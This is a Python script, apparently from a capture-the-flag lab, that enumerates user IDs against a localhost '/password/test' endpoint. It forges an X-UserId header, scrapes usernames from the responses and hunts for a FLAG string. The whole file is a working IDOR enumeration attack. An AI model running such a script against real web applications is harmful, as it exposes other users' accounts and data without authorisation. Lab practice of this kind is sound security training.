import requests
import json
import time
import re

# Configuration
BASE_URL = "http://127.0.0.1:33200"
ENDPOINT = "/password/test"
VALID_USER_ID = "10032"  # From reconnaissance

# Setup session with authentication
session = requests.Session()
headers = {
    "X-UserId": VALID_USER_ID,
    "User-Agent": "Security-Testing-Agent"
}

# Test ranges
ranges = [
    (1, 1000, "low_range"),
    (10025, 10100, "target_range")
]

# Results storage
valid_ids = []
flag_found = None

print("=" * 70)
print("ID FUZZING CAMPAIGN - GET /password/test?user_id=XX")
print("=" * 70)
print(f"Target: {BASE_URL}{ENDPOINT}")
print(f"Auth Header: X-UserId: {VALID_USER_ID}")
print(f"Testing ranges: 1-1000, 10025-10100")
print("=" * 70)

# Get baseline response with valid user_id
print("\n[+] Getting baseline response with user_id=10032...")
try:
    baseline_url = f"{BASE_URL}{ENDPOINT}?user_id={VALID_USER_ID}"
    baseline_response = session.get(baseline_url, headers=headers, timeout=10)
    baseline_status = baseline_response.status_code
    baseline_text = baseline_response.text
    baseline_length = len(baseline_text)
    
    print(f"[+] Baseline URL: {baseline_url}")
    print(f"[+] Baseline: Status={baseline_status}, Length={baseline_length}")
    
    # Extract baseline content pattern
    if "Username:" in baseline_text:
        baseline_match = re.search(r'Username:\s*([^<]+)', baseline_text)
        if baseline_match:
            baseline_username = baseline_match.group(1).strip()
            print(f"[+] Baseline username: {baseline_username}")
    
except Exception as e:
    print(f"[-] Baseline request failed: {e}")
    baseline_status = 0
    baseline_length = 0
    baseline_text = ""

# Fuzz user_id parameter
print("\n[+] Starting fuzzing campaign...")
total_tested = 0
success_count = 0

for start, end, range_name in ranges:
    print(f"\n{'='*70}")
    print(f"Testing range: {start}-{end} ({range_name})")
    print(f"{'='*70}")
    range_valid = 0
    
    for user_id in range(start, end + 1):
        total_tested += 1
        
        try:
            # Construct GET URL with query parameter
            test_url = f"{BASE_URL}{ENDPOINT}?user_id={user_id}"
            
            # Send GET request
            response = session.get(test_url, headers=headers, timeout=5)
            
            status_code = response.status_code
            response_text = response.text
            response_length = len(response_text)
            
            # Track success patterns
            if status_code == 200 and response_length > 1000:
                success_count += 1
                range_valid += 1
                
                # Check for username pattern
                username_match = None
                if "Username:" in response_text:
                    username_match = re.search(r'Username:\s*([^<\n]+)', response_text)
                
                # Check for FLAG pattern
                flag_match = None
                if "FLAG{" in response_text:
                    flag_start = response_text.find("FLAG{")
                    flag_end = response_text.find("}", flag_start)
                    if flag_end > flag_start:
                        flag_content = response_text[flag_start:flag_end+1]
                        print(f"\n{'!'*70}")
                        print(f"🎯 FLAG FOUND with user_id={user_id}!")
                        print(f"📍 Flag: {flag_content}")
                        print(f"{'!'*70}")
                        flag_found = {
                            "user_id": user_id,
                            "flag": flag_content,
                            "status_code": status_code,
                            "length": response_length
                        }
                
                # Store valid ID info
                valid_entry = {
                    "user_id": user_id,
                    "status_code": status_code,
                    "length": response_length,
                    "diff_from_baseline": response_length - baseline_length
                }
                
                if username_match:
                    valid_entry["username"] = username_match.group(1).strip()
                
                valid_ids.append(valid_entry)
                
                # Show interesting findings
                if user_id != int(VALID_USER_ID):
                    display_username = username_match.group(1).strip() if username_match else "N/A"
                    print(f"✅ Valid ID: {user_id} | Username: {display_username} | Length: {response_length}")
            
            # Show progress every 100 requests
            if user_id % 100 == 0:
                print(f"    Progress: Tested {total_tested} IDs... | Range found: {range_valid}")
            
            # Rate limiting
            time.sleep(0.02)
            
        except requests.exceptions.Timeout:
            print(f"[-] Timeout for user_id={user_id}")
            continue
        except Exception as e:
            if "timeout" not in str(e).lower():
                print(f"[-] Error for user_id={user_id}: {e}")
            continue
    
    print(f"[+] Range {range_name} complete: Found {range_valid} valid IDs")

# Final summary
print("\n" + "=" * 70)
print("FUZZING CAMPAIGN COMPLETE")
print("=" * 70)
print(f"📊 Total IDs tested: {total_tested}")
print(f"✅ Valid IDs found: {success_count}")

if flag_found:
    print("\n" + "=" * 70)
    print("🏆 FLAG FOUND!")
    print("=" * 70)
    print(f"   User ID: {flag_found['user_id']}")
    print(f"   Flag: {flag_found['flag']}")
    print("=" * 70)
else:
    print("\n[⚠️]  No flag found in tested ranges")

# Show all valid IDs found
if valid_ids:
    print("\n" + "=" * 70)
    print("VALID USER IDs DISCOVERED:")
    print("=" * 70)
    for entry in valid_ids:
        if entry['user_id'] != int(VALID_USER_ID):
            username_display = entry.get('username', 'N/A')
            print(f"  user_id={entry['user_id']:5d} | Username: {username_display:15s} | Length: {entry['length']}")
    
    # Check if our current user is in the list
    current_user = [e for e in valid_ids if e['user_id'] == int(VALID_USER_ID)]
    if current_user:
        entry = current_user[0]
        username_display = entry.get('username', 'N/A')
        print(f"  user_id={entry['user_id']:5d} | Username: {username_display:15s} | Length: {entry['length']} (YOUR USER)")

# Save results
results = {
    "flag_found": flag_found,
    "valid_ids": valid_ids,
    "total_tested": total_tested,
    "successful_requests": success_count,
    "baseline": {
        "user_id": VALID_USER_ID,
        "status": baseline_status,
        "length": baseline_length
    }
}

print("\n" + "=" * 70)
print("📋 DETAILED RESULTS:")
print("=" * 70)
print(json.dumps(results, indent=2))
print("=" * 70)
